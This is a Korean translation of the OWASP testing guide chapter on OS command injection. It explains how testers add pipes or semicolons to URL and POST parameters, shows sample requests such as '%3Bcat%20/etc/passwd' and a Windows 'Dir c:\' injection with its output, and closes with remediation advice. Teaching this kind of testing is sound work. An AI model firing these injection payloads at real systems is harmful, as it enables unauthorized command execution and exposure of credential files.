============================================================================================
OTG-INPVAL-013 (커멘드 인젝션 침투 테스트)
============================================================================================

|

개요
============================================================================================

이 섹션은 OS 커멘드 인젝션으로 어플리케이션을 테스트하는 방법을 설명합니다.
테스터는 어플리케이션에서 HTTP 요청을 통해 OS 명령을 삽입할 수 있습니다.
OS 명령 인젝션은 웹 서버에 OS 명령을 실행하기 위해 웹 인터페이스를 사용하는 기술입니다.

사용자는 웹 인터페이스를 통해 OS 명령을 실행하기 위해 운영체제 명령어를 입력합니다.
제대로 필터링되지 않은 웹 인터페이스는 해당 공격에 취약할 수 있습니다.

OS 명령을 실행하는 명령으로 사용자는 악성 프로그램을 업로드하거나 패스워드를 획득할 수 있습니다.
OS 명령 인젝션은 어플리케이션 설계와 개발시 보안이 강조되어 야 예발될 수 있습니다.

|

테스트 방법
============================================================================================

웹 어플리케이션에서 파일을 볼 때, 종종 URL에서 파일명이 보여집니다.
Perl은 파이프 명령을 사용할 수 있습니다.

사용자는 간단하게 파일명 끝에 파이프 "|" 기호를 추가할 수 있습니다.

**예제**

[변경 전]

.. code-block:: html

    http://sensitive/cgi-bin/userData.pl?doc=user1.txt

[변경 후]

.. code-block:: html

    http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|

위와 같은 경우 "/bin/ls"를 실행할 것입니다.

.PHP 페이지 URL 끝에 세미콜론을 추가하는 것으로 운영체제 명령이 실행될 것입니다.

%3B는 세미콜론이 url 암호화된 것입니다.

**예제**

.. code-block:: html
    
    http://sensitive/something.php?dir=%3Bcat%20/etc/passwd

|

**예제**

인터넷으로부터 브라우징할 수 있는 문서 설정을 포함한 어플리케이션의 경우를 고려해봅시다.
만약 당신이 WebScarab을 사용한다면, POST HTTP를 얻을 수 있습니다.

이 post 요청에서, 어플리케이션이 공개 문서를 검색하는 방법을 알 수 있습니다.
이제 POST HTTP에 운영체제 명령을 삽입하여 추가할 수 있는지 테스트 할 수 있습니다.

다음을 시도해보십시오:

.. code-block:: html
    
    POST http://www.example.com/public/doc HTTP/1.1
    Host: www.example.com
    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it;
    rv:1.8.1) Gecko/20061010 FireFox/2.0
    Accept: text/xml,application/xml,application/xhtml+xml,-
    text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
    Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 300
    Proxy-Connection: keep-alive
    Referer: http://127.0.0.1/WebGoat/attack?Screen=20
    Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E-
    34F24A0A5
    Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
    Content-Type: application/x-www-form-urlencoded
    Content-length: 33
    
    Doc=Doc1.pdf

만약 어플리케이션이 요청에 대한 유효성 검사를 하지 않는다면, 다음 결과를 획득할 수 있습니다.

.. code-block:: html

    POST http://www.example.com/public/doc HTTP/1.1
    Host: www.example.com
    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it;
    rv:1.8.1) Gecko/20061010 FireFox/2.0
    Accept: text/xml,application/xml,application/xhtml+xml,text/
    html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
    Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 300
    Proxy-Connection: keep-alive
    Referer: http://127.0.0.1/WebGoat/attack?Screen=20
    Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E-
    34F24A0A5
    Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
    Content-Type: application/x-www-form-urlencoded
    Content-length: 33

    Doc=Doc1.pdf+|+Dir c:\

이 경우, 성공적으로 OS 삽입 공격을 수행할 수 있습니다.

.. code-block:: html

    Exec Results for ‘cmd.exe /c type "C:\httpd\public\
    doc\"Doc=Doc1.pdf+|+Dir c:\’
    Output...
    Il volume nell’unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
     Doc
     11/11/2006 17:25
     Documents and Settings
     25/10/2006 03:11
     I386
     14/11/2006 18:51
     h4ck3r
     30/09/2005 21:40 25,934
     OWASP1.JPG
     03/11/2006 18:29
     Prog
     18/11/2006 11:20
     Program Files
     16/11/2006 21:12
     Software
     24/10/2006 18:25
     Setup
     24/10/2006 23:37
     Technologies
     18/11/2006 11:14
     3 File 32,496 byte
     13 Directory 6,921,269,248 byte disponibili
     Return code: 0

|

Tools
============================================================================================

- OWASP WebScarab
- OWASP WebGoat

|

References
============================================================================================

White papers
---------------------------------------------------------------------------------------

- http://www.securityfocus.com/infocus/1709


|

Remediation
============================================================================================

Sanitization
--------------------------------------------------------------------------------------

The URL and form data needs to be sanitized for invalid characters.
A "blacklist" of characters is an option but it may be difficult
to think of all of the characters to validate against. Also there
may be some that were not discovered as of yet. A "white list"
containing only allowable characters should be created to validate
the user input. Characters that were missed, as well as undiscovered
threats, should be eliminated by this list.
Permissions
The web application and its components should be running under
strict permissions that do not allow operating system command
execution. Try to verify all these informations to test from a Gray
Box point of view